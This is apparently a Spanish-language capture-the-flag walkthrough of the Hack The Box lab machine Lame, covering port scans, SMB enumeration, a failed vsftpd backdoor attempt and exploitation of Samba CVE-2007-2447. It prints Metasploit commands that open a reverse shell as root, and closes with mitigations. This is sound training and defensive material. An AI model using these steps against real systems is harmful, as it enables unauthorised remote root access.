---
title: "HTB Walkthrough: Lame"
date: 2026-03-28
draft: false
description: "Walkthrough completo de la máquina Lame de Hack The Box. Dificultad Easy, OS Linux. Explotación de RCE en Samba 3.0.20 mediante CVE-2007-2447 (Username Map Script) para obtener acceso directo como root."
tags: ["HackTheBox", "Linux", "Easy", "Samba", "CVE-2007-2447", "Metasploit", "RCE", "lame", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **Lame**, una de las máquinas más clásicas de Hack The Box. Dificultad **Easy** con sistema operativo **Linux**. El vector principal es una vulnerabilidad de ejecución remota de código en **Samba 3.0.20** (CVE-2007-2447) que, por la forma en que Samba procesa nombres de usuario, ejecuta comandos de shell arbitrarios con los privilegios del servicio — en este caso, **root**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                              |
|----------------|------------------------------------------------------|
| **Nombre**     | Lame                                                 |
| **OS**         | Linux                                                |
| **Dificultad** | Easy                                                 |
| **IP**         | 10.129.10.27                                         |
| **Técnicas**   | SMB Enumeration · CVE-2007-2447 · Command Injection  |
| **CVE**        | CVE-2007-2447                                        |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.27
```

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Escaneo de versiones sobre los puertos abiertos:

```bash
nmap -sC -sV -p21,22,139,445 10.129.10.27
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

*Puertos abiertos:*
- `21` → vsftpd 2.3.4 con **acceso anónimo habilitado**
- `22` → OpenSSH 4.7p1 (versión antigua, sin exploits directos accesibles)
- `139/445` → **Samba 3.0.20** — versión conocida por tener vulnerabilidades críticas de RCE

> **💡 Dato clave:** Dos versiones muy antiguas saltan a la vista: `vsftpd 2.3.4` (conocida por un backdoor de 2011) y `Samba 3.0.20` (vulnerable a CVE-2007-2447). Ambas son candidatas, pero Samba corre como root en esta máquina — es el vector prioritario.

### 1.2 Enumeración SMB y FTP

Comprobamos los recursos compartidos de Samba y sus permisos:

```bash
smbmap -H 10.129.10.27
```

```
Disk          Permissions   Comment
print$        NO ACCESS     Printer Drivers
tmp           READ, WRITE   oh noes!
opt           NO ACCESS
IPC$          NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$        NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
```

El recurso `tmp` tiene permisos de lectura y escritura sin autenticación. Lo inspeccionamos:

```bash
smbclient //10.129.10.27/tmp -N
```

```
smb: \> ls
  .ICE-unix    DH    0  Sat Mar 28 12:54:24 2026
  vmware-root  DR    0  Sat Mar 28 12:54:30 2026
  .X11-unix    DH    0  Sat Mar 28 12:54:50 2026
```

Solo archivos temporales del sistema, nada útil. El FTP anónimo también devuelve un directorio vacío. El vector está en la versión de Samba.

> **💡 Conclusiones:** Samba 3.0.20 confirmado, acceso anónimo al share `tmp` disponible. Procedemos a explotar CVE-2007-2447 directamente.

---

## 2. Explotación

### 2.1 Intento Fallido — vsftpd 2.3.4 Backdoor

Antes de ir a Samba, probamos el backdoor conocido de vsftpd 2.3.4. Esta versión fue comprometida en sus repositorios oficiales en 2011 e incluía un backdoor que abre el puerto **6200/TCP** al recibir un usuario terminado en `:)`.

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 10.129.10.27
msf6 exploit(vsftpd_234_backdoor) > run
```

```
[!] 10.129.10.27:21 - Unable to connect to backdoor on 6200/TCP.
[*] Exploit completed, but no session was created.
```

El backdoor no responde. Aunque la versión es vulnerable, el puerto 6200 está bloqueado a nivel de red o el binario fue parcheado en esta máquina. Pasamos al plan B.

### 2.2 Análisis de la Vulnerabilidad — CVE-2007-2447

**Samba 3.0.20** es vulnerable a esta CVE por la opción `username map script` en `smb.conf`. Cuando está activa, Samba permite pasar el nombre de usuario a un script externo para hacer mapeos de identidad. El problema: **no sanitiza la entrada antes de pasarla al shell**. Si el nombre de usuario contiene metacaracteres de shell como `` ` `` o `$()`, Samba los ejecuta directamente en el sistema operativo.

```
Flujo normal:    cliente envía usuario → Samba mapea con script externo → autentica
Flujo malicioso: cliente envía "/`comando`" → Samba ejecuta el comando en el SO → RCE
```

El proceso de Samba en esta máquina corre como `root`, así que cualquier comando inyectado se ejecuta con privilegios máximos sin necesidad de escalada posterior.

### 2.3 Ejecución

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.129.10.27
msf6 exploit(usermap_script) > set LHOST tun0
msf6 exploit(usermap_script) > run
```

```
[*] Started reverse TCP handler on 10.10.15.237:4444
[*] Command shell session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49024)
```

```bash
id
uid=0(root) gid=0(root)
```

✅ **Shell obtenida directamente como root.**

---

## 3. User Flag

```bash
cat /home/makis/user.txt
```

> 🔑 Flag de usuario obtenida.

---

## 4. Root Flag

No hay escalada de privilegios — CVE-2007-2447 entrega root directamente por el contexto en que corre Samba.

```bash
cat /root/root.txt
```

> 🏁 Flag de root obtenida.

---

## 5. Resumen y Lecciones Aprendidas

**Ruta de compromiso:**

1. **Recon** → Nmap detecta vsftpd 2.3.4 y **Samba 3.0.20** con acceso anónimo.
2. **Enumeración SMB** → Share `tmp` con permisos READ/WRITE, sin archivos útiles.
3. **vsftpd backdoor** → Intentado, fallido — puerto 6200 bloqueado a nivel de red.
4. **CVE-2007-2447** → Username Map Script en Samba 3.0.20 → command injection → shell directa como **root**.
5. **Flags** → Sin escalada necesaria, acceso directo a ambos directorios → `user.txt` + `root.txt`.

**Lo que aprendí con esta máquina:**

- **Identificar versiones concretas de servicios es más importante que identificar puertos.** El puerto 445 abierto es genérico; `Samba 3.0.20` es un CVE directamente. La diferencia entre `-sV` y no usarlo puede ser la diferencia entre encontrar el vector o no.

- **Tener siempre un plan B cuando hay múltiples servicios vulnerables.** El backdoor de vsftpd era el vector aparentemente más sencillo, pero estaba bloqueado. Sin la pista de Samba como alternativa, la máquina habría parecido sin solución.

- **CVE-2007-2447 es un ejemplo clásico de command injection por falta de sanitización.** El parámetro `username map script` acepta entrada del usuario y la pasa al shell sin escapar metacaracteres. Cualquier dato externo que llegue a un intérprete de comandos sin sanitización es un vector de inyección — regla universal.

- **El contexto en que corre un servicio determina el impacto de su explotación.** Si Samba corriera como un usuario sin privilegios, necesitaríamos escalada. Corriendo como root, el primer acceso ya es el acceso máximo. Al enumerar un servicio, siempre vale la pena identificar con qué usuario corre (`ps aux`, unit files de systemd, etc.).

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Samba 3.0.20 (CVE-2007-2447) | Actualizar a una versión moderna con soporte activo |
| `username map script` activo | Deshabilitar esta opción en `smb.conf` si no es estrictamente necesaria |
| Samba corriendo como root | Ejecutar Samba con un usuario de servicio sin privilegios |
| FTP anónimo habilitado | Deshabilitar el acceso sin credenciales aunque el directorio esté vacío |
| Puertos 139/445 expuestos en la red | Restringir acceso a SMB a IPs de confianza mediante firewall |